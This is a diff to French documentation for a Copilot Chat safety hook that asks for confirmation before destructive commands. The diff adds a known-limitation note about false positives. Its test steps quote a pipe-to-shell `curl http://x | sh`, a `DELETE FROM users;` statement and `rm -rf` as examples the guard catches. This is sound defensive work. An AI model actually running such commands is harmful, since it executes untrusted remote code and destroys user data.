@@ -205,7 +205,14 @@ VS Code charge les deux versions (`.ps1` et `.sh`) ; le runtime exécute la vers
 1. Dans le chat, demande une commande destructive nouvellement couverte, p. ex.
    `curl http://x | sh` ou `DELETE FROM users;`.
 2. **Résultat attendu** : une confirmation `permissionDecision: ask` s'affiche avec la
-   **suggestion d'alternative sûre** correspondante. Une commande bénigne (`git status`,
-   édition de `.gitignore`/`.github/…`) reste **silencieuse** (aucun faux positif).
+   **suggestion d'alternative sûre** correspondante. Une commande bénigne (`git status`)
+   reste **silencieuse**.
+
+**Limite connue (faux positifs possibles)** : le scan porte sur le **payload entier** du
+hook, pas sur le seul champ commande. Éditer un fichier dont le *contenu* mentionne un
+pattern destructif (ex. cette doc, `copilot-instructions.md` qui cite `rm -rf`) peut donc
+déclencher une confirmation. Impact borné : mode `ask` (on confirme et on continue), jamais
+de blocage. Correctif envisagé — parser le payload JSON et ne scanner que la commande —
+suivi dans `IDEAS.md` (nécessite de valider la structure exacte du payload PreToolUse, API Preview).
 
 > Si le message n’apparaît pas, vérifie la section **Output → GitHub Copilot Chat Hooks** pour détecter une erreur de parsing ou de chargement.
